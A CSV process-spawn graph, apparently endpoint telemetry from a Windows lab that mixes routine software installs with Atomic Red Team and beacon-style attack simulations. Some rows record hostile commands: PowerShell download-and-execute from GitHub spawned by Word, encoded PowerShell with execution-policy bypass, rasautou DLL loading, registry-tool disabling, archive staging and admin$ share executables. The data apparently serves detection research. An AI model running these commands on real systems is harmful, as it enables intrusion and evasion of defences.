Source,Target,Type,Weight,Commands
proc::c:/windows/syswow64/msiexec.exe,proc::c:/windows/syswow64/rundll32.exe,spawned,6,"rundll32.exe ""C:\Windows\Installer\MSI3306.tmp"",zzzzInvokeManagedCustomActionOutOfProc SfxCA_773602125 3093 SetupConfigCustomAction!Squirrel.SetupConfigCustomAction.SettingsCustomActions.RemoveRegKeyFromPreviousInstall | rundll32.exe ""C:\Windows\Installer\MSI4E20.tmp"",zzzzInvokeManagedCustomActionOutOfProc SfxCA_773607359 3099 SetupConfigCustomAction!Squirrel.SetupConfigCustomAction.SettingsCustomActions.CopyConfig | rundll32.exe ""C:\Windows\Installer\MSIADF1.tmp"",zzzzInvokeManagedCustomActionOutOfProc SfxCA_4894671 26613 SetupConfigCustomAction!Squirrel.SetupConfigCustomAction.SettingsCustomActions.RemoveRegKeyFromPreviousInstall | rundll32.exe ""C:\Windows\Installer\MSIB4F7.tmp"",zzzzInvokeManagedCustomActionOutOfProc SfxCA_4896156 26619 SetupConfigCustomAction!Squirrel.SetupConfigCustomAction.SettingsCustomActions.CopyConfig | rundll32.exe ""C:\Windows\Installer\MSIAA62.tmp"",zzzzInvokeManagedCustomActionOutOfProc SfxCA_13806718 26613 SetupConfigCustomAction!Squirrel.SetupConfigCustomAction.SettingsCustomActions.RemoveRegKeyFromPreviousInstall"
proc::c:/windows/system32/msiexec.exe,proc::c:/windows/syswow64/msiexec.exe,spawned,17,C:\Windows\syswow64\MsiExec.exe -Embedding 3498711333DBB15B306BB85B274C0C71 | C:\Windows\syswow64\MsiExec.exe -Embedding A9A4E6E1AB8EB7015F3DEE8A6A4D4540 | c:\Windows\syswow64\MsiExec.exe -Embedding 9F303571AA576EFE0129B2F727AEF536 E Global\MSI0000 | C:\Windows\syswow64\MsiExec.exe -Embedding A9E50E0D60C2C4418863A2711AD26795 E Global\MSI0000 | c:\Windows\syswow64\MsiExec.exe -Embedding 6367AD27DD2B32F7A647A89BC0BCF2FE E Global\MSI0000
proc::c:/windows/system32/msiexec.exe,proc::c:/windows/system32/msiexec.exe,spawned,18,C:\Windows\System32\MsiExec.exe -Embedding 3B3EC1640C4D80CDBF88A89468165DC7 | C:\Windows\System32\MsiExec.exe -Embedding 442511D5F0042368B9A16B35ED61948C C | c:\Windows\System32\MsiExec.exe -Embedding 81094DD26632A55523C52821AD195AA6 E Global\MSI0000 | c:\Windows\System32\MsiExec.exe -Embedding A20F2DB0BEED04C09BFBCDA5F185AD12 E Global\MSI0000 | C:\Windows\System32\MsiExec.exe -Embedding 7C173E38E1EF41FEEA4D5D00A0801E5E
proc::c:/windows/system32/msiexec.exe,proc::c:/programdata/microsoft/defaultpackmsi/mainbootstrap.exe,spawned,3,"""C:\ProgramData\Microsoft\DefaultPackMSI\MainBootStrap.exe"" install | ""C:\ProgramData\Microsoft\DefaultPackMSI\MainBootStrap.exe"" install | ""C:\ProgramData\Microsoft\DefaultPackMSI\MainBootStrap.exe"" install"
proc::c:/windows/system32/msiexec.exe,proc::c:/windows/system32/windowspowershell/v1.0/powershell.exe,spawned,12,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host JScript executed me!; exit | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -Command Write-Host JScript executed me!; exit | powershell.exe -nop -Command Write-Host DllUnregisterServer export executed me; exit | powershell.exe -nop -Command Write-Host DllRegisterServer export executed me; exit | powershell.exe -nop -Command Write-Host CustomAction export executed me; exit"
proc::c:/windows/system32/msiexec.exe,proc::c:/windows/installer/msi601c.tmp,spawned,1,"""C:\Windows\Installer\MSI601C.tmp"" ""Hello, Atomic Red Team from an EXE!"""
proc::c:/windows/system32/msiexec.exe,proc::c:/windows/installer/msi5685.tmp,spawned,1,"""C:\Windows\Installer\MSI5685.tmp"" ""Hello, Atomic Red Team from an EXE!"""
proc::c:/windows/system32/msiexec.exe,proc::c:/windows/system32/cmd.exe,spawned,1,"""cmd.exe"" /c ""ipconfig /all"""
proc::c:/programdata/package cache/a78d1c6fc532cd468c767506bcbb600c304d4dc0/py.exe,proc::c:/program files/python38/python.exe,spawned,3,"""C:\Program Files\Python38\python.exe"" -OO -E -s -Wi ""C:\Program Files\Python38\Lib\compileall.py"" -f -x ""bad_coding|badsyntax|site-packages|py2_|lib2to3\\tests|venv\\scripts"" ""C:\Program Files\Python38\Lib"" | ""C:\Program Files\Python38\python.exe"" -O -E -s -Wi ""C:\Program Files\Python38\Lib\compileall.py"" -f -x ""bad_coding|badsyntax|site-packages|py2_|lib2to3\\tests|venv\\scripts"" ""C:\Program Files\Python38\Lib"" | ""C:\Program Files\Python38\python.exe"" -E -s -Wi ""C:\Program Files\Python38\Lib\compileall.py"" -f -x ""bad_coding|badsyntax|site-packages|py2_|lib2to3\\tests|venv\\scripts"" ""C:\Program Files\Python38\Lib"""
proc::c:/windows/temp/{18f4a599-fd78-4966-ac74-683ee580725a}/.be/python-3.8.9-amd64.exe,proc::c:/programdata/package cache/a78d1c6fc532cd468c767506bcbb600c304d4dc0/py.exe,spawned,3,"""C:\ProgramData\Package Cache\A78D1C6FC532CD468C767506BCBB600C304D4DC0\py.exe"" -3.8 -OO -E -s -Wi ""C:\Program Files\Python38\Lib\compileall.py"" -f -x ""bad_coding|badsyntax|site-packages|py2_|lib2to3\\tests|venv\\scripts"" ""C:\Program Files\Python38\Lib"" | ""C:\ProgramData\Package Cache\A78D1C6FC532CD468C767506BCBB600C304D4DC0\py.exe"" -3.8 -O -E -s -Wi ""C:\Program Files\Python38\Lib\compileall.py"" -f -x ""bad_coding|badsyntax|site-packages|py2_|lib2to3\\tests|venv\\scripts"" ""C:\Program Files\Python38\Lib"" | ""C:\ProgramData\Package Cache\A78D1C6FC532CD468C767506BCBB600C304D4DC0\py.exe"" -3.8 -E -s -Wi ""C:\Program Files\Python38\Lib\compileall.py"" -f -x ""bad_coding|badsyntax|site-packages|py2_|lib2to3\\tests|venv\\scripts"" ""C:\Program Files\Python38\Lib"""
proc::c:/windows/temp/{ba8896e4-be04-422c-91ee-24052508d566}/.cr/python-3.8.9-amd64.exe,proc::c:/windows/temp/{18f4a599-fd78-4966-ac74-683ee580725a}/.be/python-3.8.9-amd64.exe,spawned,1,"""C:\Windows\Temp\{18F4A599-FD78-4966-AC74-683EE580725A}\.be\python-3.8.9-amd64.exe"" -q -burn.elevated BurnPipe.{A2C04021-BA92-4509-80B0-07B5D4271B07} {57D5E1F0-BB75-405D-915C-CE3CD6E1784F} 2872"
proc::c:/users/administrator/downloads/python-3.8.9-amd64.exe,proc::c:/windows/temp/{ba8896e4-be04-422c-91ee-24052508d566}/.cr/python-3.8.9-amd64.exe,spawned,1,"""C:\Windows\Temp\{BA8896E4-BE04-422C-91EE-24052508D566}\.cr\python-3.8.9-amd64.exe"" -burn.clean.room=""C:\Users\Administrator\Downloads\python-3.8.9-amd64.exe"" -burn.filehandle.attached=500 -burn.filehandle.self=504 "
proc::c:/users/administrator/downloads/fakenet1.0c/fakenet1.0b/fakenet.exe,proc::c:/windows/syswow64/ipconfig.exe,spawned,2,ipconfig /flushdns | ipconfig /flushdns
proc::c:/program files/git/git-cmd.exe,proc::c:/windows/system32/cmd.exe,spawned,1,"C:\Windows\system32\cmd.exe /K ""doskey git=^""C:\Program Files\Git\cmd\git.exe^"" $*"""
proc::c:/windows/temp/{51b57d1c-aa70-4954-af83-9720f9a809f6}/.cr/vcredist_x64.exe,proc::c:/windows/temp/{9566fd17-4228-44d3-8e7a-f53c5a390b29}/.be/vc_redist.x64.exe,spawned,1,"""C:\Windows\Temp\{9566FD17-4228-44D3-8E7A-F53C5A390B29}\.be\VC_redist.x64.exe"" -q -burn.elevated BurnPipe.{9CF6F77D-BF9D-42EA-9A23-39332541F87E} {59E6ACF4-BF94-45EA-9947-D0C673B39B89} 4420"
proc::c:/program files/wireshark/vcredist_x64.exe,proc::c:/windows/temp/{51b57d1c-aa70-4954-af83-9720f9a809f6}/.cr/vcredist_x64.exe,spawned,1,"""C:\Windows\Temp\{51B57D1C-AA70-4954-AF83-9720F9A809F6}\.cr\vcredist_x64.exe"" -burn.clean.room=""C:\Program Files\Wireshark\vcredist_x64.exe"" -burn.filehandle.attached=580 -burn.filehandle.self=588 /install /quiet /norestart"
proc::c:/users/administrator/downloads/wireshark-win64-3.4.4.exe,proc::c:/program files/wireshark/vcredist_x64.exe,spawned,1,"""C:\Program Files\Wireshark\vcredist_x64.exe"" /install /quiet /norestart"
proc::c:/windows/system32/windowspowershell/v1.0/powershell_ise.exe,proc::c:/program files/suricata/suricata.exe,spawned,1,"""C:\Program Files\Suricata\suricata.exe"" -c suricata.yaml -i 10.0.1.14"
proc::c:/windows/system32/windowspowershell/v1.0/powershell_ise.exe,proc::c:/windows/system32/msiexec.exe,spawned,1,"""C:\Windows\system32\msiexec.exe"" /i c:\temp\Suricata.msi /l*v c:\temp\suricataInstallLog.txt /qn"
proc::c:/windows/system32/windowspowershell/v1.0/powershell_ise.exe,proc::c:/windows/system32/rasautou.exe,spawned,1,"""C:\Windows\system32\rasautou.exe"" -d C:\temp\duedlligence.dll -p powershell –a a –e e"
proc::c:/windows/system32/windowspowershell/v1.0/powershell_ise.exe,proc::c:/windows/system32/cmd.exe,spawned,1,"""C:\Windows\system32\cmd.exe"" /c c:\temp\notrundll32.exe C:\payloads\beacon.dll,Start"
proc::c:/temp/npcap.exe,proc::c:/windows/syswow64/schtasks.exe,spawned,1,"SCHTASKS.EXE /Create /F /RU SYSTEM /SC ONSTART /TN npcapwatchdog /TR ""'C:\Program Files\Npcap\CheckStatus.bat'"" /NP"
proc::c:/temp/npcap.exe,proc::c:/program files/npcap/npfinstall.exe,spawned,3,"""C:\Program Files\Npcap\NPFInstall.exe"" -n -i | ""C:\Program Files\Npcap\NPFInstall.exe"" -n -iw | ""C:\Program Files\Npcap\NPFInstall.exe"" -n -c"
proc::c:/temp/npcap.exe,proc::c:/users/admini~1/appdata/local/temp/nsne683.tmp/npfinstall.exe,spawned,1,"""C:\Users\ADMINI~1\AppData\Local\Temp\nsnE683.tmp\NPFInstall.exe"" -n -check_dll"
proc::c:/program files/npcap/npfinstall.exe,proc::c:/windows/system32/pnputil.exe,spawned,1,pnputil.exe -e
proc::c:/users/administrator/desktop/officesetup.exe,proc::c:/windows/syswow64/windowspowershell/v1.0/powershell.exe,spawned,4,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile ""$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; if (!$package) { $Error.Add(\""Package is not installed\"")}; if ($error.Count -eq 0) { Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateResult.scratch' -InputObject '1' -Encoding ascii; } else { Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateResult.scratch' -InputObject '0' -Encoding ascii; Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateError.scratch' -InputObject $error -Encoding ascii;} "" | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile ""$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; if (!$package) { $Error.Add(\""Package is not installed\"")}; if ($error.Count -eq 0) { Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateResult.scratch' -InputObject '1' -Encoding ascii; } else { Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateResult.scratch' -InputObject '0' -Encoding ascii; Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateError.scratch' -InputObject $error -Encoding ascii;} "" | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile ""$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; if (!$package) { $Error.Add(\""Package is not installed\"")}; if ($error.Count -eq 0) { Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateResult.scratch' -InputObject '1' -Encoding ascii; } else { Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateResult.scratch' -InputObject '0' -Encoding ascii; Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateError.scratch' -InputObject $error -Encoding ascii;} "" | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile ""$package = Get-AppxPackage Microsoft.Office.Desktop -allUsers; if (!$package) { $Error.Add(\""Package is not installed\"")}; if ($error.Count -eq 0) { Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateResult.scratch' -InputObject '1' -Encoding ascii; } else { Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateResult.scratch' -InputObject '0' -Encoding ascii; Out-File -FilePath 'C:\Users\ADMINI~1\AppData\Local\Temp\2\Office.ValidateError.scratch' -InputObject $error -Encoding ascii;} """
proc::c:/users/administrator/desktop/officesetup.exe,proc::c:/program files/common files/microsoft shared/clicktorun/officeclicktorun.exe,spawned,2,OfficeClickToRun.exe platform=x64 culture=en-us productstoadd=O365ProPlusRetail.16_en-us_x-none cdnbaseurl.16=http://officecdn.microsoft.com/pr/7ffbc6bf-bc32-4f92-8982-f9dd17fd3114 baseurl.16=http://officecdn.microsoft.com/pr/7ffbc6bf-bc32-4f92-8982-f9dd17fd3114 version.16=16.0.13127.21348 mediatype.16=CDN sourcetype.16=CDN O365ProPlusRetail.excludedapps.16=groove bitnessmigration=False deliverymechanism=7ffbc6bf-bc32-4f92-8982-f9dd17fd3114 flt.useoutlookshareaddon=unknown flt.useofficehelperaddon=unknown | OfficeClickToRun.exe platform=x64 culture=en-us productstoadd=O365ProPlusRetail.16_en-us_x-none cdnbaseurl.16=http://officecdn.microsoft.com/pr/7ffbc6bf-bc32-4f92-8982-f9dd17fd3114 baseurl.16=http://officecdn.microsoft.com/pr/7ffbc6bf-bc32-4f92-8982-f9dd17fd3114 version.16=16.0.13127.21348 mediatype.16=CDN sourcetype.16=CDN O365ProPlusRetail.excludedapps.16=groove bitnessmigration=False deliverymechanism=7ffbc6bf-bc32-4f92-8982-f9dd17fd3114 flt.useoutlookshareaddon=unknown flt.useofficehelperaddon=unknown
proc::c:/windows/syswow64/windowspowershell/v1.0/powershell.exe,proc::c:/windows/syswow64/gpupdate.exe,spawned,1,C:\Windows\syswow64\gpupdate.exe
proc::c:/windows/syswow64/windowspowershell/v1.0/powershell.exe,proc::c:/windows/syswow64/rundll32.exe,spawned,1,C:\Windows\syswow64\rundll32.exe
proc::c:/windows/syswow64/windowspowershell/v1.0/powershell.exe,proc::c:/windows/syswow64/cmd.exe,spawned,1,"C:\Windows\system32\cmd.exe /c """"C:\Temp\1.bat"""""
proc::c:/windows/syswow64/windowspowershell/v1.0/powershell.exe,proc::c:/windows/syswow64/reg.exe,spawned,2,"""C:\Windows\system32\reg.exe"" add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f | ""C:\Windows\system32\reg.exe"" add HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f"
proc::c:/program files/microsoft office/root/integration/integrator.exe,proc::c:/windows/system32/schtasks.exe,spawned,36,"schtasks.exe /Create /tn ""Microsoft\Office\OfficeTelemetryAgentFallBack2016"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_OfficeTelemetryAgentFallBack2016.xml"" | schtasks.exe /Delete /F /tn ""Microsoft\Office\OfficeTelemetryAgentFallBack2016"" | schtasks.exe /Create /tn ""Microsoft\Office\OfficeTelemetryAgentLogOn2016"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_OfficeTelemetryAgentLogOn2016.xml"" | schtasks.exe /Delete /F /tn ""Microsoft\Office\OfficeTelemetryAgentLogOn2016"" | schtasks.exe /Create /tn ""Microsoft\Office\Office Feature Updates Logon"" /XML ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\Microsoft_Office_Office Feature Updates Logon.xml"""
proc::c:/program files/microsoft office/root/integration/integrator.exe,proc::c:/windows/system32/wevtutil.exe,spawned,21,"wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\AirSpace.Etw.man"" /rf:""C:\Program Files\Microsoft Office\root\VFS\ProgramFilesCommonX64\Microsoft Shared\Office16\mso.dll"" /mf:""C:\Program Files\Microsoft Office\root\VFS\ProgramFilesCommonX64\Microsoft Shared\Office16\mso.dll"" | wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\wordEtw.man"" /rf:""C:\Program Files\Microsoft Office\root\Office16\wwlib.dll"" /mf:""C:\Program Files\Microsoft Office\root\Office16\wwlib.dll"" | wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\AirSpace.Etw.man"" /rf:""C:\Program Files\Microsoft Office\root\VFS\ProgramFilesCommonX64\Microsoft Shared\Office16\mso.dll"" /mf:""C:\Program Files\Microsoft Office\root\VFS\ProgramFilesCommonX64\Microsoft Shared\Office16\mso.dll"" | wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\msoutilstat.etw.man"" /rf:""C:\Program Files\Microsoft Office\root\Office16\msoetwres.dll"" /mf:""C:\Program Files\Microsoft Office\root\Office16\msoetwres.dll"" | wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\wordEtw.man"" /rf:""C:\Program Files\Microsoft Office\root\Office16\wwlib.dll"" /mf:""C:\Program Files\Microsoft Office\root\Office16\wwlib.dll"""
proc::c:/program files/microsoft office/root/integration/addons/onedrivesetup.exe,proc::c:/program files/microsoft office/root/integration/addons/onedrivesetup.exe,spawned,6,"C:\Program Files\Microsoft Office\root\integration\Addons\OneDriveSetup.exe /silent  /peruser  /childprocess  /enableOMCTelemetry  | ""C:\Program Files\Microsoft Office\root\integration\Addons\OneDriveSetup.exe"" C:\Program Files\Microsoft Office\root\integration\Addons\OneDriveSetup.exe /silent  /permachine  /silent  /childprocess  /enableOMCTelemetry /cusid:S-1-5-21-3199041234-613076988-4072312029-500  | C:\Program Files\Microsoft Office\root\integration\Addons\OneDriveSetup.exe /silent  /peruser  /childprocess  /enableOMCTelemetry  | ""C:\Program Files\Microsoft Office\root\integration\Addons\OneDriveSetup.exe"" C:\Program Files\Microsoft Office\root\integration\Addons\OneDriveSetup.exe /silent  /permachine  /silent  /childprocess  /enableOMCTelemetry /cusid:S-1-5-21-3743396216-727310467-2711319494-500  | C:\Program Files\Microsoft Office\root\integration\Addons\OneDriveSetup.exe /silent  /peruser  /childprocess  /enableOMCTelemetry "
proc::c:/program files/microsoft office/root/integration/addons/onedrivesetup.exe,proc::c:/users/administrator/appdata/local/microsoft/onedrive/18.151.0729.0013/filesyncconfig.exe,spawned,3,"""C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\18.151.0729.0013\FileSyncConfig.exe""  | ""C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\18.151.0729.0013\FileSyncConfig.exe""  | ""C:\Users\Administrator\AppData\Local\Microsoft\OneDrive\18.151.0729.0013\FileSyncConfig.exe"" "
proc::c:/program files/microsoft office/root/office16/winword.exe,proc::c:/windows/syswow64/rundll32.exe,spawned,1,C:\Windows\SysWOW64\rundll32.exe
proc::c:/program files/microsoft office/root/office16/winword.exe,proc::c:/windows/syswow64/dllhost.exe,spawned,3,C:\Windows\SysWOW64\dllhost.exe | C:\Windows\SysWOW64\dllhost.exe | C:\Windows\SysWOW64\dllhost.exe
proc::c:/program files/microsoft office/root/office16/winword.exe,proc::c:/windows/syswow64/gpupdate.exe,spawned,1,C:\Windows\SysWOW64\gpupdate.exe
proc::c:/program files/microsoft office/root/office16/winword.exe,proc::c:/windows/syswow64/searchprotocolhost.exe,spawned,1,C:\Windows\SysWOW64\SearchProtocolHost.exe
proc::c:/program files/microsoft office/root/office16/winword.exe,proc::c:/windows/system32/cmd.exe,spawned,11,"cmd.exe /c ping 8.8.8.8 | ""C:\Windows\System32\cmd.exe""  | C:\Windows\system32\cmd.exe /c """"C:\Users\Public\kjh4ek\ndj34h.bat"" "" | C:\Windows\system32\cmd.exe /c """"C:\Users\Public\kjh4ek\ban3j.bat"" "" | C:\Windows\system32\cmd.exe /c """"C:\Users\Public\hg32j.bat"" """
proc::c:/program files/microsoft office/root/office16/winword.exe,proc::c:/windows/system32/windowspowershell/v1.0/powershell.exe,spawned,2,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/dragonstail_benign.ps1') | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/dragonstail_benign.ps1')"
proc::c:/program files/microsoft office/root/office16/winword.exe,proc::c:/windows/syswow64/cscript.exe,spawned,1,C:\Windows\SysWOW64\cscript.exe
proc::c:/program files/microsoft office/root/office16/winword.exe,proc::c:/windows/system32/cscript.exe,spawned,2,cscript.exe c:\atomicredteam\atomics\T1082\src\griffon_recon.vbs | cscript.exe c:\atomicredteam\atomics\T1082\src\griffon_recon.vbs
proc::c:/windows/syswow64/rundll32.exe,proc::c:/windows/syswow64/cmd.exe,spawned,2,C:\Windows\system32\cmd.exe /c c:\windows\system32\calc.exe | C:\Windows\system32\cmd.exe /c c:\windows\system32\calc.exe
proc::c:/windows/syswow64/rundll32.exe,proc::c:/users/administrator/documents/7z.exe,spawned,3,C:\Users\Administrator\Documents\7z.exe a -v500m -mx9 -r0 .\file1.zip | C:\Users\Administrator\Documents\7z.exe a -v500m -mx9 -r0 .\file1.zip | C:\Users\Administrator\Documents\7z.exe a -v500m -mx9 -r0 .\file2.txt
proc::c:/programdata/microsoft/defaultpackmsi/mainbootstrap.exe,proc::c:/windows/syswow64/msiexec.exe,spawned,3,"""msiexec.exe"" /i C:\ProgramData\Microsoft\DefaultPackMSI\MicrosoftSearchInBing.msi /qn | ""msiexec.exe"" /i C:\ProgramData\Microsoft\DefaultPackMSI\MicrosoftSearchInBing.msi /qn | ""msiexec.exe"" /i C:\ProgramData\Microsoft\DefaultPackMSI\MicrosoftSearchInBing.msi /qn"
proc::c:/users/administrator/desktop/artifact.exe,proc::c:/windows/system32/rundll32.exe,spawned,1,C:\Windows\system32\rundll32.exe
proc::c:/users/administrator/desktop/artifact.exe,proc::c:/windows/system32/windowspowershell/v1.0/powershell.exe,spawned,1,powershell -nop -exec bypass -EncodedCommand dwBoAG8AYQBtAGkA
proc::c:/users/administrator/desktop/beacon_jquery.exe,proc::c:/windows/system32/dllhost.exe,spawned,2,C:\Windows\system32\dllhost.exe | C:\Windows\system32\dllhost.exe
proc::c:/windows/system32/dllhost.exe,proc::c:/windows/system32/cmd.exe,spawned,2,"""C:\Windows\system32\cmd.exe""  | ""C:\Windows\system32\cmd.exe"" "
proc:://127.0.0.1/admin$/4cd3ee7.exe,proc::c:/windows/system32/rundll32.exe,spawned,1,C:\Windows\System32\rundll32.exe
proc::c:/users/administrator/desktop/artifact_trickbot_ryuk.exe,proc::c:/windows/system32/gpupdate.exe,spawned,3,C:\Windows\system32\gpupdate.exe | C:\Windows\system32\gpupdate.exe | C:\Windows\system32\gpupdate.exe
proc::c:/windows/system32/gpupdate.exe,proc::c:/windows/system32/cmd.exe,spawned,3,C:\Windows\system32\cmd.exe /c echo e1dfb2b91c6 > \\.\pipe\e09446 | C:\Windows\system32\cmd.exe /c echo c4784b416cf > \\.\pipe\187607 | C:\Windows\system32\cmd.exe /c echo 8bd40923b14 > \\.\pipe\62ce35
proc::c:/windows/system32/gpupdate.exe,proc::c:/windows/system32/gpupdate.exe,spawned,2,C:\Windows\system32\gpupdate.exe | C:\Windows\system32\gpupdate.exe
proc:://127.0.0.1/admin$/31a4b3e.exe,proc::c:/windows/system32/rundll32.exe,spawned,1,C:\Windows\System32\rundll32.exe
proc:://127.0.0.1/admin$/dcf35e4.exe,proc::c:/windows/system32/rundll32.exe,spawned,1,C:\Windows\System32\rundll32.exe
proc::c:/users/administrator/desktop/artifact_o365.exe,proc::c:/windows/system32/gpupdate.exe,spawned,3,C:\Windows\system32\gpupdate.exe | C:\Windows\system32\gpupdate.exe | C:\Windows\system32\gpupdate.exe
proc:://win-dc-177/admin$/0c50289.exe,proc::c:/windows/system32/rundll32.exe,spawned,1,C:\Windows\System32\rundll32.exe
